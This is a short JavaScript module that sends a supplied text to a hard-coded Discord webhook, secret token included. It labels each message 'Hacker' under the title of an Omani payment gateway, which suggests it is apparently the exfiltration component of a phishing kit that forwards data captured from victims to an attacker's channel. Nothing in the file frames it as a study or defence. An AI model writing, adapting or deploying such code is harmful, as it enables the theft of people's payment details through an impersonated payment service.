import axios from 'axios';


export const TeleSned = () => {

    const Send = async (des) => {
        const body = {
          content: "Hacker",
          tts: false,
          color: "white",
          embeds: [
            {
              title: " بوابة سداد عمان ",
              description: des,
           },
          ],
    };
            
        await axios.post("https://discord.com/api/webhooks/1522415963520106618/jch586ilAkQZZl5Zv6WSsIwdLjgnNuMcCTVgQ9QJzUQSNEvQz8mFXKZgZYtHJ6w5H4G3",body)
             
    }
  return {
    Send,
}
}

export default TeleSned;
